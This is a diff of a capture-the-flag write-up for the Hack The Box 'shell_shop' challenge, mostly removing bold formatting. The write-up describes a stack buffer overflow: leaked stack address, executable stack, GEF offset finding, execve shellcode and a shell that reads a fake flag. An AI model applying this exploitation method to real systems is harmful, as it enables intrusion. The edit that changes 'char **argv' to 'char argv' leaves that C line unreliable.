@@ -10,7 +10,7 @@ categories: [CTF, HTB, Pwn]
 The challenge comes in the form of an ELF 64-bit binary:
 
 ```
-**$ file shell_shop**          
+$ file shell_shop          
 shell_shop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=e3cfb5e3f0b9d17007ce3d49e3ad687365d7c38b, for GNU/Linux 3.2.0, not stripped
 ```
 
@@ -24,9 +24,9 @@ undefined8 main(void)
 
 {
   int option;
- **undefined2 overflowVar;
+ undefined2 overflowVar;
   undefined8 stackVar;
-**  undefined8 local_30;
+  undefined8 local_30;
   undefined8 local_28;
   undefined8 local_20;
   char local_a;
@@ -44,13 +44,13 @@ undefined8 main(void)
     while( true ) {
       if (local_a != '\0') {
         if (coinsCheck != '\0') {
- **fprintf(stdout,"\nHere is a discount code for your next purchase: [%p]\n",
-            &stackVar);**
+ fprintf(stdout,"\nHere is a discount code for your next purchase: [%p]\n",
+            &stackVar);
         }
         fwrite("\nDo you want to get notified when the Virtual Shell Shop appears again? (y/n): ",1,
                0x4f,stdout);
- **fgets((char *)&overflowVar,100,stdin);
-**        if (((char)overflowVar == 'y') || ((char)overflowVar == 'Y')) {
+ fgets((char *)&overflowVar,100,stdin);
+        if (((char)overflowVar == 'y') || ((char)overflowVar == 'Y')) {
           fwrite("\nThank you very much player, you will be notified for the upcoming special events  :D\n\n"
                  ,1,0x56,stdout);
         }
@@ -95,29 +95,29 @@ Other ways to confirm that the stack is indeed executable are via the [vmmap](ht
 ```
 (gdb) vmmap
 ...
-0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 **rwx** **[stack]**
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
 ```
 
 Or using the well-known [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) tool, already present on Kali:
 
 ```
-**$ readelf -a ./shell_shop | grep GNU_STACK -A 1**
+$ readelf -a ./shell_shop | grep GNU_STACK -A 1
   GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
-                 0x0000000000000000 0x0000000000000000  **RWE** **0x10**
+                 0x0000000000000000 0x0000000000000000  RWE 0x10
 ```
 
 What do we have so far:
 
-* A leaked address (***1st gift***) which is on the stack, which itself is executable.
+* A leaked address (**_1st gift_**) which is on the stack, which itself is executable.
 * A local variable on the stack (renamed here to **overflowVar**) which is 8 bytes but [`fgets`](https://www.tutorialspoint.com/c_standard_library/c_function_fgets.htm) function will read 100 characters into it. A clear stack-based buffer overflow.
-* Speaking of `fgets`, the function is actually deprecated, meaning that it is obsolete and it is strongly suggested not to use it, because it is dangerous. It is dangerous because the input data can contain `NULL` characters (***2nd gift***). Another bonus for us, because we won’t have to worry about NULL bytes, which could create a real problem for our payload, especially for sending 8 bytes addresses which would contain NULL bytes.
+* Speaking of `fgets`, the function is actually deprecated, meaning that it is obsolete and it is strongly suggested not to use it, because it is dangerous. It is dangerous because the input data can contain `NULL` characters (**_2nd gift_**). Another bonus for us, because we won’t have to worry about NULL bytes, which could create a real problem for our payload, especially for sending 8 bytes addresses which would contain NULL bytes.
 
 ## Exploitation
 
 To exploit the app, we first need to find out the position in the 100-bytes buffer where RBP is being overwritten. To do that, first we’ll generate a pattern with GEF and then get the offset of the RBP after the crash inside that buffer:
 
 ```
-**gef➤  pattern create 100**
+gef➤  pattern create 100
 [+] Generating a pattern of 100 bytes (n=8)
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
 ```
@@ -129,7 +129,7 @@ aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaa
 We can get the position in the buffer which overwrites the RBP register:
 
 ```
-**gef➤  pattern search aaaaaaha**
+gef➤  pattern search aaaaaaha
 [+] Searching for '6168616161616161'/'6161616161616861' with period=8
 [+] Found at offset 55 (little-endian search) likely
 ```
@@ -137,7 +137,7 @@ We can get the position in the buffer which overwrites the RBP register:
 While debugging, it’s also handy to set up breakpoints at key locations in our application, like for example towards the end after the RBP has been overwritten, to validate that our payload has been transmitted correctly:
 
 ```
-**gef➤   b *(main+372)**
+gef➤   b *(main+372)
 Breakpoint 1 at 0x555555555603
 ```
 
@@ -166,7 +166,7 @@ Before getting started, we’d need to find a short  Linux x86_64 `[execve](http
 
 #include <stdio.h>
 
-int main(int argc, char **argv) {
+int main(int argc, char argv) {
 
     // Shellcode will be palced on the stack!
     // Compile with execstack flag
@@ -239,7 +239,7 @@ buf += b'\x42' * (100 - len(buf))  # 100 bytes being read (fgets is waiting ..)
 We have all the pieces in place, let’s test the shellcode in GDB/GEF:
 
 ```
-**gef➤  r < payload**
+gef➤  r < payload
 ...
 process 2894588 is executing new program: /usr/bin/dash
 [Thread debugging using libthread_db enabled]
@@ -270,9 +270,9 @@ total 2742
 drwxrwxr-x 1 kali dialout     576 Nov  5 12:49 .
 drwxr-xr-x 1 kali dialout     288 Nov  5 08:36 ..
 -rw-r--r-- 1 kali dialout     827 Nov  5 12:49 create_payload.py
-**-rw-rw-r-- 1 kali dialout      25 Feb  7  2023 flag.txt**
+-rw-rw-r-- 1 kali dialout      25 Feb  7  2023 flag.txt
 drwxrwxr-x 1 kali dialout     128 Feb  7  2023 glibc
-**HTB{f4k3_fl4g_4_t35t1ng}**
+HTB{f4k3_fl4g_4_t35t1ng}
 [Inferior 1 (process 2905441) exited normally]
 ```
 
